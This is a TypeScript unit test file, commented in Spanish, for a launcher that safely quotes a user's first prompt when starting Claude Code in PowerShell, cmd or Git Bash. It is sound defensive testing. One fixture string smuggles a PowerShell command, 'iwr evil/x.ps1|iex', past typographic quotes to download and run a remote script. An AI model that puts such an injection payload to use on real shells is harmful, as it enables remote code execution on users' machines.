import { test } from 'node:test'
import assert from 'node:assert/strict'
import { baseEnv, pastePayload, PROMPT_VAR, psArg, psPromptValue, shellLaunch, windowsArgBody } from './claude-launch'

const EXE = 'C:\\Users\\ana\\AppData\\Roaming\\npm\\node_modules\\@anthropic-ai\\claude-code\\bin\\claude.exe'
const MALO = 'Revisá el README’; iwr evil/x.ps1|iex; ’'
const WORD = 'Revisá el user’s guide y ‘esto’ ‚y‛ "aquello"'

// Imita el tokenizador de PowerShell para un string simple: cualquiera de las 5 comillas lo cierra y doblada es literal.
function psSingleQuoted(src: string): { value: string; rest: string } {
  const Q = /['\u2018\u2019\u201A\u201B]/
  assert.ok(Q.test(src[0]))
  let value = ''
  let i = 1
  while (i < src.length) {
    const c = src[i]
    if (Q.test(c)) {
      if (Q.test(src[i + 1] ?? '')) {
        value += src[i + 1]
        i += 2
        continue
      }
      return { value, rest: src.slice(i + 1) }
    }
    value += c
    i++
  }
  throw new Error('string sin cerrar')
}

test('psArg dobla las cuatro comillas tipográficas además de la ASCII', () => {
  for (const s of [MALO, WORD, "it's", '‘a’', '‚b‛']) {
    const { value, rest } = psSingleQuoted(psArg(s))
    assert.equal(value, s)
    assert.equal(rest, '')
  }
})

test('el primer mensaje nunca aparece en la línea de comandos de la shell', () => {
  for (const family of ['ps', 'cmd', 'posix'] as const) {
    for (const exe of [EXE, undefined]) {
      const l = shellLaunch(family, { argv: ['claude'], prompt: MALO, exe })
      const line = family === 'ps' ? Buffer.from(l.args[3], 'base64').toString('utf16le') : l.args.join(' ')
      assert.ok(!line.includes('iwr'), `${family} ${exe ? 'exe' : 'sin exe'}`)
    }
  }
})

// CommandLineToArgvW (reglas de 2008 en adelante) para un solo argumento.
function argvW(arg: string): string[] {
  const out: string[] = []
  let cur = ''
  let inQ = false
  let has = false
  for (let i = 0; i < arg.length; ) {
    const c = arg[i]
    if (c === '\\') {
      let n = 0
      while (arg[i] === '\\') (n++, i++)
      if (arg[i] === '"') {
        cur += '\\'.repeat(n >> 1)
        if (n % 2) (cur += '"', i++)
      } else cur += '\\'.repeat(n)
      has = true
      continue
    }
    if (c === '"') {
      if (inQ && arg[i + 1] === '"') (cur += '"', i += 2)
      else (inQ = !inQ, i++)
      has = true
      continue
    }
    if ((c === ' ' || c === '\t') && !inQ) {
      if (has) out.push(cur)
      cur = ''
      has = false
      i++
      continue
    }
    cur += c
    has = true
    i++
  }
  if (has) out.push(cur)
  return out
}

// NativeCommandParameterBinder.NeedQuotes del modo Legacy: si da true, PowerShell suma sus comillas.
function psLegacyNeedsQuotes(s: string): boolean {
  let afterBackslash = false
  let quotes = 0
  for (const c of s) {
    if (c === '"' && !afterBackslash) quotes++
    else if (/\s/.test(c) && quotes % 2 === 0) return true
    afterBackslash = c === '\\'
  }
  return false
}

const DIFICILES = [WORD, MALO, 'fin con barra\\', 'C:\\x\\ "q\\" \\\\"', '"', '$env:PATH `n ; % %PATH%', '日本語 🦥', 'a\tb  c']

test('PowerShell: el valor de SLOTH_PROMPT pasa sin tocar en Legacy y llega entero a claude', () => {
  for (const p of DIFICILES) {
    const v = psPromptValue(p)
    assert.equal(psLegacyNeedsQuotes(v), false, p)
    assert.deepEqual(argvW(v), [p], p)
  }
})

function decodePs(b64: string): string {
  return Buffer.from(b64, 'base64').toString('utf16le')
}

test('PowerShell con claude.exe: script fijo en -EncodedCommand, el mensaje por variable después de --', () => {
  const l = shellLaunch('ps', { argv: ['claude'], prompt: WORD, exe: EXE })
  assert.deepEqual(l.args.slice(0, 3), ['-NoLogo', '-NoExit', '-EncodedCommand'])
  assert.equal(
    decodePs(l.args[3]),
    `& { $PSNativeCommandArgumentPassing = 'Legacy'; $p = $env:${PROMPT_VAR}; Remove-Item Env:${PROMPT_VAR} -ErrorAction Ignore; & '${EXE}' -- $p }`
  )
  assert.equal(l.env[PROMPT_VAR], psPromptValue(WORD))
  assert.equal(l.paste, undefined)
  const sin = shellLaunch('ps', { argv: ['claude', '--continue'], exe: EXE })
  assert.equal(decodePs(sin.args[3]), `& '${EXE}' --continue`)
})

test('Git Bash con claude.exe: "$p" después de --, sin conversión de rutas de MSYS', () => {
  const l = shellLaunch('posix', { argv: ['claude'], prompt: '/ticket PROJ-12', exe: EXE })
  assert.equal(l.args[3], `p=$${PROMPT_VAR}; unset ${PROMPT_VAR}; MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL='*' '${EXE}' -- "$p"; unset p; exec bash --login -i`)
  assert.equal(l.env[PROMPT_VAR], '/ticket PROJ-12')
})

test('un mensaje que podría ser un subcomando se pega en vez de ir como argumento', () => {
  for (const p of ['update', 'mcp', 'kill', 'continuar', 'nuevo-sub']) {
    const l = shellLaunch('ps', { argv: ['claude'], prompt: p, exe: EXE })
    assert.equal(l.paste, p)
    assert.deepEqual(l.env, {})
  }
  for (const p of ['Update', 'update ', 'update the README', 'continuá']) assert.equal(shellLaunch('ps', { argv: ['claude'], prompt: p, exe: EXE }).paste, undefined, p)
})

test('cmd o sin claude.exe: el mensaje se pega cuando Claude arranca', () => {
  for (const [family, exe] of [['cmd', EXE], ['ps', undefined], ['posix', undefined], ['ps', 'C:\\npm\\claude.cmd']] as const) {
    const l = shellLaunch(family, { argv: ['claude'], prompt: 'hola\r\nmundo\x1b[201~x', exe })
    assert.equal(l.paste, 'hola mundo [201~x')
    assert.deepEqual(l.env, {})
  }
  const cmd = shellLaunch('cmd', { argv: ['claude', '--continue'], exe: EXE })
  assert.deepEqual(cmd.args, ['/k', `${EXE} --continue`])
})

test('cmd con una ruta con espacios vuelve a `claude` y solo esa línea no busca en la carpeta actual', () => {
  const l = shellLaunch('cmd', { argv: ['claude'], exe: 'C:\\Users\\Juan Pérez\\claude.exe' })
  assert.deepEqual(l.args, ['/k', 'set NoDefaultCurrentDirectoryInExePath=1& claude& set NoDefaultCurrentDirectoryInExePath='])
  assert.deepEqual(l.env, {})
})

test('el pegado no se puede cerrar antes de tiempo', () => {
  assert.equal(pastePayload('a\x1b[201~b'), '\x1b[200~a [201~b\x1b[201~')
})

test('windowsArgBody sigue las reglas de CommandLineToArgvW', () => {
  assert.equal(windowsArgBody('a"b'), 'a\\"b')
  assert.equal(windowsArgBody('a\\"b'), 'a\\\\\\"b')
  assert.equal(windowsArgBody('fin\\'), 'fin\\\\')
  assert.equal(windowsArgBody('C:\\x\\y'), 'C:\\x\\y')
})

test('baseEnv saca credenciales y no cambia cómo busca comandos la terminal', () => {
  const env = baseEnv({ PATH: 'C:\\x', ANTHROPIC_API_KEY: 'k', SLOTH_TOKEN: 't', CLAUDE_CODE_X: '1' })
  assert.deepEqual(env, { PATH: 'C:\\x', TERM_PROGRAM: 'Sloth' })
})
